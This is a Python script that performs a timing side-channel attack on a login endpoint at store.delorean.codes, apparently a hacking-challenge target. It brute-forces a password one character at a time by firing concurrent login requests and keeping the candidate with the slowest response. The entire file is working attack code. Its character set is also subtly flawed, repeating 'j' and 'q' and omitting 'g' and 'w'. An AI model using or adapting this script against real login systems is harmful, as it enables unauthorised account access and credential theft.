import argparse
import random
import grequests

URL = 'https://store.delorean.codes/u/{github}/login'
LETTERS = 'abcdefjhijklmnopqrstuvqxyzABCDEFJHIJKLMNOPQRSTUVQXYZ0123456789'
MIN_LEN = 6


def shuffle(items):
    items = list(items)
    random.shuffle(items)
    return items


def to_password(prefix, letter):
    password = prefix + letter
    if len(password) < MIN_LEN:
        password += '$' * (MIN_LEN - len(password))
    return password


def get_letter(username, prefix):
    letters = LETTERS  # shuffle(LETTERS)
    responses = grequests.map([
        grequests.post(URL, data={
            'username': username,
            'password': to_password(prefix, letter),
        })
        for letter in letters
    ])
    times = [response.elapsed for response in responses]
    times = dict(zip(letters, times))

    response_to_letter = {}
    for letter, response in zip(letters, responses):
        response_to_letter.setdefault(response.text, []).append(letter)
    if len(response_to_letter) != 1:
        for response, letters in response_to_letter.items():
            for letter in letters:
                print(prefix + letter)
            print(response)
            print()
            print()
            print()
        raise RuntimeError('Unexpected repsonse')

    top = sorted(times.keys(), key=lambda letter: times[letter], reverse=True)
    total_time = sum(t.total_seconds() for t in times.values())
    for letter in top[:5]:
        time = times[letter].total_seconds()
        average_other_time = (total_time - time) / (len(times) - 1)
        ratio = time / average_other_time
        print(username, prefix + letter, times[letter], '{:.2f}'.format(ratio))
    print()

    return top[0]


def get_password(username, prefix=''):
    while True:
        prefix += get_letter(username, prefix)
    return prefix


def main():
    global URL
    parser = argparse.ArgumentParser()
    parser.add_argument('--github', default='slava-sh')
    parser.add_argument('--username')
    parser.add_argument('--prefix', default='')
    args = parser.parse_args()
    github = args.github
    username = args.username
    prefix = args.prefix
    URL = URL.format(github=github)
    print(username, get_password(username, prefix))


if __name__ == '__main__':
    main()
